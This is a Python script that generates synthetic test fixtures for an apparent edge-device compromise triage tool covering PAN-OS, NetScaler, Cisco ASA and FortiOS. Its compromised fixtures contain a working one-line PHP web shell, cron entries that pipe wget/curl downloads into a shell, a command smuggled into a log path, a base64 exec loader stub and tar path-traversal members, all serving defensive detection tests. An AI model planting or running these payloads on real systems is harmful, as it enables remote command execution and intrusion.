#!/usr/bin/env python3
"""Build synthetic replay fixtures for the test suite.

Every value here is invented. Addresses come from the documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), hostnames and users are
placeholders, and the "malicious" content is the minimum needed to exercise a
detection - no working exploit or implant code.

Fixtures are generated rather than committed because several of them depend
on exact bytes (non-printable memory-leak bytes, tar members with traversal
paths and symlinks) that do not survive editors and git attributes reliably.

Usage:  python tests/make_fixtures.py <out_dir>
"""
from __future__ import annotations

import io
import json
import sys
import tarfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from edgetriage.util import slugify  # noqa: E402

GUID = "3f2b8c1e-9d4a-4b7e-a1c2-5e6f7a8b9c0d"


def write_cmds(root: Path, outputs: dict[str, str | bytes]) -> None:
    for cmd, text in outputs.items():
        p = root / "commands" / f"{slugify(cmd)}.txt"
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(text if isinstance(text, bytes) else text.encode())


def write_files(root: Path, files: dict[str, str | bytes]) -> None:
    for remote, data in files.items():
        p = root / "files" / remote.lstrip("/")
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data if isinstance(data, bytes) else data.encode())


# ----------------------------------------------------------------- PAN-OS
PANOS_COMMON = {
    "show clock": "Thu Oct 22 14:02:11 UTC 2026\n",
    "show system info": "hostname: fw-lab-01\nip-address: 192.0.2.10\nmodel: PA-VM\nsw-version: 10.2.9\nuptime: 41 days, 3:10:22\n",
    "show system resources": "top - 14:02:12 up 41 days\n  PID USER  %CPU COMMAND\n 1021 root   1.0 mgmtsrvr\n",
    "show admins all": "Admin    From          Client Session-start\nadmin    192.0.2.50    CLI    10/22 13:58:01\n",
    "show jobs all": "Enqueued  Dequeued  ID  Type  Status Result\n2026/10/01 09:00:00 2026/10/01 09:00:01 101 Commit FIN OK\n",
    "show config running": "<config version=\"10.2.0\"><devices/></config>\n",
    "show log config direction equal backward": "2026/10/20 10:00:00 admin config set deviceconfig system\n",
    "show log auth direction equal backward": "2026/10/20 09:59:00 auth success user=admin from=192.0.2.50\n",
}


def panos(root: Path, malicious: bool) -> None:
    gp = [f'{{"time":"2026-10-14T06:51:00.120-07:00","message":"session {GUID} established"}}']
    syslog = ["2026/10/14 06:40:00 system general  GlobalProtect portal started"]
    if malicious:
        gp += [
            '{"time":"2026-10-14T06:53:09.123-07:00","message":"failed to unmarshal session(./../../../opt/panlogs/tmp/device_telemetry/minute/x) map , EOF"}',
            '{"time":"2026-10-14T06:53:41.456-07:00","message":"failed to unmarshal session(./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}198.51.100.7:4444`) map , EOF"}',
        ]
        syslog += ["2026/10/14 07:00:01 crond[4411]: (root) CMD (wget -qO- http://203.0.113.9/policy | bash)"]
    else:
        gp += [f'{{"time":"2026-10-14T07:10:00.000-07:00","message":"failed to unmarshal session({GUID}) map , EOF"}}']
    out = dict(PANOS_COMMON)
    out["tail lines 10000 mp-log gpsvc.log"] = "\n".join(gp) + "\n"
    out["show log system direction equal backward"] = "\n".join(syslog) + "\n"
    out["tail lines 10000 mp-log sslvpn_ngx_error.log"] = "2026/10/14 06:52:00 [error] 2211#0: open() failed (2: No such file)\n"
    write_cmds(root, out)


def panos_tsf(path: Path) -> None:
    """A TSF-shaped tarball with UPSTYLE-shaped artefacts and hostile members."""
    blob = "QUJD" * 80
    members = {
        "opt/pancfg/mgmt/python3/site-packages/system.pth":
            f"import os, base64\nexec(base64.b64decode('{blob}'))\n",
        "var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js":
            '<config version="10.2.0"><mgt-config><users/></mgt-config></config>\n',
        "var/log/pan/gpsvc.log":
            f'{{"time":"2026-10-14T06:51:00.000-07:00","message":"session {GUID} established"}}\n',
    }
    with tarfile.open(path, "w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            raw = data.encode()
            info.size = len(raw)
            tf.addfile(info, io.BytesIO(raw))
        evil = tarfile.TarInfo("../../escape.txt")
        evil.size = 4
        tf.addfile(evil, io.BytesIO(b"nope"))
        link = tarfile.TarInfo("var/lang/custom/x")
        link.type = tarfile.SYMTYPE
        link.linkname = "/"
        tf.addfile(link)


# ----------------------------------------------------------------- NetScaler
SHELL_PHP = b"<?php if(isset($_REQUEST['c'])){ system($_REQUEST['c']); } ?>\n"
BENIGN_PHP = b"<?php\n/* logon helper */\nheader('Location: /vpn/index.html');\n?>\n"


def netscaler(root: Path, malicious: bool) -> None:
    base = "/var/netscaler/logon/LogonPoint"
    php = {f"{base}/index.php": BENIGN_PHP}
    ls = [f"  81234  8 -r--r--r--  1 nobody  wheel  {len(BENIGN_PHP)} Jun 11  2026 {base}/index.php"]
    if malicious:
        php[f"{base}/uiareas/a1b2.php"] = SHELL_PHP
        ls.append(f"  81300  8 -rw-r--r--  1 nobody  wheel  {len(SHELL_PHP)} Oct 14 07:12 {base}/uiareas/a1b2.php")
    listing = "\n".join(php) + "\n"
    out = {
        "shell date -u": "Thu Oct 22 14:02:11 UTC 2026\n",
        "show ns version": "NetScaler NS14.1: Build 43.50.nc\n Done\n",
        "shell uptime": " 2:02PM  up 40 days,  1:01, 1 user\n",
        "shell ps auxww": "USER PID %CPU COMMAND\nroot 1 0.0 /sbin/init\n",
        "shell netstat -an": "Proto Recv-Q Send-Q Local Address Foreign Address (state)\n",
        "shell sockstat -46": "USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS\nroot     nsppe      812   10 tcp4   *:443                 *:*\n"
                              + ("nobody   sh         4410  3  tcp4   192.0.2.20:51234      203.0.113.9:4444\n" if malicious else ""),
        "show ns runningConfig": "set ns config -IPAddress 192.0.2.20\n",
        "shell find /var/netscaler/logon /var/vpn /netscaler/ns_gui /var/netscaler/ns_gui -type f -name '*.php' -ls": "\n".join(ls) + "\n",
        "shell find /var/netscaler/logon /var/vpn /netscaler/ns_gui /var/netscaler/ns_gui -type f -name '*.php'": listing,
        "shell find /var /tmp /flash -xdev -type f -perm -4000": "/var/tmp/.x/su2\n" if malicious else "",
        "shell crontab -l": "*/5 * * * * curl -s http://203.0.113.9/u | sh\n" if malicious else "# no entries\n",
        "shell cat /etc/crontab": "SHELL=/bin/sh\n0 * * * * root newsyslog\n",
        "shell ls -la /tmp /var/tmp": "total 0\n",
        "shell find /var/log -maxdepth 1 -type f -name 'ns.log*'": "/var/log/ns.log\n",
        "shell find /var/log -maxdepth 1 -type f -name 'http*.log*'": "/var/log/httpaccess.log\n",
    }
    write_cmds(root, out)
    nslog = [b'Oct 14 06:00:00 <local0.info> 192.0.2.20 10/14/2026:06:00:00 GMT ns-gw 0-PPE-0 : default AAA LOGIN_FAILED 101 0 :  User jdoe-lab - Client_ip 198.51.100.20 - Failure_reason "Invalid credentials"']
    if malicious:
        nslog.append(b'Oct 14 06:05:01 <local0.info> 192.0.2.20 10/14/2026:06:05:01 GMT ns-gw 0-PPE-0 : default AAA LOGIN_FAILED 102 0 :  User \x00\x07\xc3\x1fX\x02 - Client_ip 198.51.100.66 - Failure_reason ""')
    files = dict(php)
    files["/var/log/ns.log"] = b"\n".join(nslog) + b"\n"
    files["/var/log/httpaccess.log"] = b'198.51.100.20 - - [14/Oct/2026:06:00:00 +0000] "GET /vpn/index.html HTTP/1.1" 200 512\n'
    write_files(root, files)


# ----------------------------------------------------------------- Cisco ASA
def asa(root: Path, malicious: bool) -> None:
    # Real `show memory region` is /proc/maps-style: start-end joined by a hyphen,
    # perms, offset, dev, inode, pathname. No 0x prefix, no length column.
    # Format pinned from Cisco's command reference and the Talos ArcaneDoor example.
    regions = [
        "Address                   Perm Offset   Dev   Inode   Pathname",
        "561d9fee9000-561da3b60000 r-xp 00000000 00:02 5955    /asa/bin/lina",
        "561da3b60000-561da4180000 rw-p 03c77000 00:02 5955    /asa/bin/lina",
    ]
    if malicious:
        # One extra executable lina region, exactly 0x1000 bytes long.
        regions.append("7f1c2a3b4000-7f1c2a3b5000 r-xp 00000000 00:02 5955    /asa/bin/lina")
    lina = "\n".join(r for r in regions if "lina" in r) + "\n"
    disk0 = ["Directory of disk0:/", "  11  -rwx  112640512  10:00:00 Jan 05 2026  asa9-20-3-smp-k8.bin"]
    if malicious:
        disk0.append("  57  -rwx  20480  07:30:12 Oct 14 2026  client_bundle_install.zip")
    out = {
        "show clock": "14:02:11.123 UTC Thu Oct 22 2026\n",
        "show version": "Cisco Adaptive Security Appliance Software Version 9.20(3)\nfw-asa-lab up 12 days 4 hours\n",
        "show memory region | include lina": lina,
        "show memory region": "\n".join(regions) + "\n",
        "show checkheaps": "Checkheaps stats from buffer validation runs\n",
        "show processes": "PC SP STATE Runtime SBASE Stack Process\n",
        "show conn count": "42 in use, 1200 most used\n",
        "show ssh sessions": "SID Client IP Version Mode Encryption\n",
        "show vpn-sessiondb summary": "Total Active : 3\n",
        "show vpn-sessiondb anyconnect": "Username : jdoe-lab  Assigned IP : 10.20.0.15  Public IP : 198.51.100.20\n",
        "show running-config": "hostname fw-asa-lab\nlogging enable\n",
        "show logging": ("Syslog logging: disabled\n" if malicious else "Syslog logging: enabled\n") + "    Facility: 20\n",
        "show crashinfo": "No crash information available\n",
        "dir /recursive disk0:": "\n".join(disk0) + "\n",
    }
    write_cmds(root, out)


# ----------------------------------------------------------------- FortiOS
FORTI_HASHES = {
    "/bin/sslvpnd": "a" * 64,
    "/bin/init": "b" * 64,
    "/lib/libips.so": "c" * 64,
}


def fortios(root: Path, malicious: bool) -> None:
    hashes = dict(FORTI_HASHES)
    if malicious:
        hashes["/bin/sslvpnd"] = "d" * 64
    lang = ["drwxr-xr-x    2 0  0   0 Mar  1 10:00 .", "-rw-r--r--    1 0  0  96 Mar  1 10:00 en.json"]
    if malicious:
        lang.append("lrwxrwxrwx    1 0  0   1 Apr  2 03:11 x -> /")
    out = {
        "get system status": "Version: FortiGate-VM64 v7.4.4,build2662,240514 (GA.F)\nHostname: fgt-lab-01\nSystem time: Thu Oct 22 14:02:11 2026\n",
        "diagnose sys top 1 50 1": "Run Time:  40 days, 2 hours\n sslvpnd  211  S  0.0  1.2\n",
        "get system performance status": "CPU states: 1% user\nUptime: 40 days\n",
        "diagnose sys session stat": "session_count=120\n",
        "get system admin list": "username  login-type  from\nadmin     ssh         192.0.2.50\n",
        "get vpn ssl monitor": "SSL-VPN Login Users:\n Index  User  Group  Auth Type  Timeout  From  HTTP in/out  HTTPS in/out\n",
        "diagnose sys filesystem hash": "\n".join(f"{h}  {p}" for p, h in hashes.items()) + "\n",
        "show": "config system global\n    set hostname \"fgt-lab-01\"\nend\n",
        "diagnose debug crashlog read": ("2026-10-13 22:01:02 <00211> application sslvpnd\n2026-10-13 22:01:02 <00211> *** signal 11 (Segmentation fault) received ***\n2026-10-13 22:01:02 sslvpnd pid=211 signal 11 received\n"
                                         if malicious else "Crash log interval is 3600 seconds\n"),
        "fnsysctl ls -la /data/lang/custom": "\n".join(lang) + "\n",
        "fnsysctl ls -la /data": "drwxr-xr-x 2 0 0 0 Mar 1 10:00 lang\n",
    }
    write_cmds(root, out)


def main(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    panos(out / "panos-compromised", True)
    panos(out / "panos-benign", False)
    panos_tsf(out / "panos-tsf.tgz")
    netscaler(out / "netscaler-compromised", True)
    netscaler(out / "netscaler-benign", False)
    asa(out / "asa-compromised", True)
    asa(out / "asa-benign", False)
    fortios(out / "fortios-compromised", True)
    (out / "fortios-baseline.json").write_text(json.dumps(FORTI_HASHES, indent=2))
    (out / "shell.php").write_bytes(SHELL_PHP)
    (out / "benign.php").write_bytes(BENIGN_PHP)


if __name__ == "__main__":
    main(Path(sys.argv[1] if len(sys.argv) > 1 else "tests/fixtures/generated"))
